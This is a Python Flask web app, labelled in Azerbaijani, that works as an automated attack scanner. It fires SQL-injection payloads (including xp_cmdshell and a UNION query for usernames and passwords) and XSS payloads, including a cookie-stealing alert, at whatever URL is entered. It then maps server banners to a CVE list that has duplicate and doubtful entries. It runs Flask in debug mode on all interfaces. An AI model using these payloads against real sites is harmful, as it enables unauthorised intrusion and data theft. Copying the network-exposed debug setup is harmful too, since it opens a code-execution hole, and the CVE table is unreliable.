from flask import Flask, request,render_template_string
import requests
from bs4 import BeautifulSoup
import re

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        target = request.form['target']
        sql_results = scan_sql_injection(target)
        xss_results = scan_xss(target)
        version_results = scan_versions(target)
        return render_template_string(HTML_TEMPLATE, target=target, sql_results=sql_results, xss_results=xss_results, version_results=version_results)
    return render_template_string(HTML_TEMPLATE, target=None, sql_results=[], xss_results=[], version_results=[])

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Cyber Vuln Scanner</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-image: url('https://images.unsplash.com/photo-1605902711622-cfb43c4437d1');
            background-size: cover;
            background-position: center;
            color: white;
            padding: 20px;
        }
        .container {
            background-color: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 10px;
        }
        input[type=text] {
            width: 300px;
            padding: 10px;
            margin-right: 10px;
        }
        input[type=submit] {
            padding: 10px 20px;
        }
        ul {
            list-style-type: square;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Cyber Vuln Scanner</h1>
        <form method="POST">
            <input type="text" name="target" placeholder="http://example.com" required>
            <input type="submit" value="Scan">
        </form>

        {% if target %}
            <h2>Nəticələr: {{ target }}</h2>

            <h3>SQL Injection Zəiflikləri</h3>
            <ul>
                {% for item in sql_results %}
                    <li>{{ item }}</li>
                {% else %}
                    <li>Tapılmadı</li>
                {% endfor %}
            </ul>

            <h3>XSS Zəiflikləri</h3>
            <ul>
                {% for item in xss_results %}
                    <li>{{ item }}</li>
                {% else %}
                    <li>Tapılmadı</li>
                {% endfor %}
            </ul>

            <h3>Server Versiyaları (Exploitlər)</h3>
            <ul>
                {% for item in version_results %}
                    <li>{{ item }}</li>
                {% else %}
                    <li>Tapılmadı</li>
                {% endfor %}
            </ul>
        {% endif %}
    </div>
</body>
</html>
"""

def scan_sql_injection(target):
    payloads = [
    "' OR '1'='1' -- ",
    "\" OR \"1\"=\"1\" -- ",
    "' OR 1=1 -- ",
    "' OR 1=1#",
    "' OR '1'='1'#",
    "' OR '1'='1'/*",
    "' OR 1=1/*",
    "' OR '1'='1'--",
    "' OR '1'='1' {",
    "' OR 1=1 LIMIT 1 -- ",
    "' OR EXISTS(SELECT * FROM users) -- ",
    "' OR SLEEP(5)--",
    "' OR 1=1 UNION SELECT NULL--",
    "'; EXEC xp_cmdshell('ping 127.0.0.1')--",
    "' AND 1=0 UNION ALL SELECT 'a','b','c'--",
    "' UNION SELECT null,null,null--",
    "' UNION SELECT username, password FROM users--",
    "' AND EXISTS(SELECT * FROM users WHERE username = 'admin') --",
    "' OR '' = '",
    "' OR 1=1 ORDER BY 1--"
 ]
    results = []
    for payload in payloads:
        try:
            r = requests.get(target + payload, timeout=5)
            if any(error in r.text.lower() for error in ["sql", "syntax", "mysql", "query"]):
                results.append(f"Zəiflik tapıldı: {target + payload}")
        except:
            continue
    return results

def scan_xss(target):
    try:
        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<script>alert(document.cookie)</script>",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<input onfocus=alert(1) autofocus>",
            "<link rel=stylesheet href=data:text/css,@import'javascript:alert(1)'>",
            "<form><button formaction=javascript:alert(1)>CLICK</button></form>",
            "<object data='javascript:alert(1)'>",
            "<video><source onerror='javascript:alert(1)'></video>",
            "<details open ontoggle=alert(1)>",
            "<a href='javascript:alert(1)'>click</a>",
            "<script>confirm(1)</script>",
            "<script>prompt(1)</script>",
            "<marquee onstart=alert(1)>",
            "<style>@keyframes x{}</style><div style='animation-name:x' onanimationstart='alert(1)'>",
            "<img src=1 onerror=confirm(1)>"
        ]

        r = requests.get(target, timeout=5)
        soup = BeautifulSoup(r.text, "html.parser")
        forms = soup.find_all("form")
        results = []

        for form in forms:
            action = form.get("action") or target
            inputs = form.find_all("input")

            for payload in xss_payloads:
                data = {}
                for input_tag in inputs:
                    name = input_tag.get("name")
                    if name:
                        data[name] = payload

                url = action if action.startswith("http") else target.rstrip("/") + "/" + action.lstrip("/")
                resp = requests.post(url, data=data, timeout=5)

                if payload in resp.text:
                    results.append(f"XSS zəifliyi: {url} -- Payload: {payload}")

        return results
    except:
        return []

def scan_versions(target):
    try:
        r = requests.get(target, timeout=5)
        headers = r.headers
        results = []

        for k, v in headers.items():
            if "server" in k.lower() or "x-powered-by" in k.lower():
                version_info = f"{k}: {v}"
                results.append(version_info)

                # Sadə versiya çıxarışı üçün nümunə (məsələn, Apache/2.4.49)
                match = re.search(r"([A-Za-z\-]+)/([\d\.]+)", v)
                if match:
                    software = match.group(1).lower()
                    version = match.group(2)

                    # Sadə exploit yoxlaması (məsələn, Apache 2.4.49 CVE-2021-41773)
                    known_vulns = {
    "apache": {
        "2.4.49": "CVE-2021-41773 - Path Traversal & RCE",
        "2.4.50": "CVE-2021-42013 - RCE (fix bypass)",
        "2.4.39": "CVE-2019-0211 - Local Privilege Escalation",
        "2.4.41": "CVE-2020-1927 - mod_rewrite DoS",
        "2.4.7":  "CVE-2014-0098 - mod_status buffer overflow",
        "2.2.34": "CVE-2017-3169 - mod_mime info disclosure",
        "2.4.46": "CVE-2020-9490 - HTTP/2 DoS",
        "2.4.49": "CVE-2021-41773 - Path Traversal RCE",
        "2.4.50": "CVE-2021-42013 - Fix bypass (RCE again)",
        "2.4.17": "CVE-2016-0736 - mod_auth_digest stack overflow",
        "2.4.37": "CVE-2019-0197 - mod_http2 crash DoS"
    },
"nginx"  : {
    "1.3.9": "Old version, potential DoS vulnerabilities   " ,
   "1.4.0": "CVE-2013-2028 - chunked encoding heap buffer overflow (RCE)",
    "1.10.0": "CVE-2016-4450 - HTTP/2 vulnerability",
    "1.12.1": "CVE-2017-7529 - Integer underflow - info disclosure",
    "1.16.0": "CVE-2019-9511 - HTTP/2 flood DoS",
    "1.17.6": "CVE-2019-20372 - Use-after-free",
    "1.18.0": "CVE-2021-23017 - 1-byte memory overwrite (RCE)",
    "1.19.0": "CVE-2020-11724 - NULL pointer dereference (DoS)",
    "1.20.1": "CVE-2022-41741 - Buffer overwrite (RCE)",
    "1.22.0": "CVE-2023-44487 - HTTP/2 Rapid Reset DoS (Real World!)"
},
  "php": {
    "5.4.0": "Very old version - multiple RCE vulnerabilities",
    "5.6.0": "CVE-2015-4602 - unserialize() RCE",
    "7.0.0": "CVE-2016-7478 - use-after-free in unserialize()",
    "7.1.0": "CVE-2017-12932 - code execution via PHAR",
    "7.2.0": "CVE-2018-14883 - Remote file overwrite",
    "7.3.0": "CVE-2019-11043 - RCE via fpm & Nginx (widely exploited!)",
    "7.4.0": "CVE-2020-7061 - path traversal in uploads",
    "8.0.0": "CVE-2021-21707 - buffer overflow",
    "8.1.0": "CVE-2022-31626 - memory corruption",
    "8.1.1": "CVE-2022-31625 - privilege escalation"
}
                    }
                    if software in known_vulns and version in known_vulns[software]:
                        vuln_info = known_vulns[software][version]
                        results.append(f"[!] Zəif versiya aşkarlandı: {software} {version} -- Exploit: {vuln_info}")
                    else:
                        results.append(f"[~] Heç bir exploit tapılmadı: {software} {version}")

        return results
    except Exception as e:
        return [f"Xəta baş verdi: {str(e)}"]

if __name__ == '__main__':
    app.run(debug=True,  host='0.0.0.0' ,
port=5000)
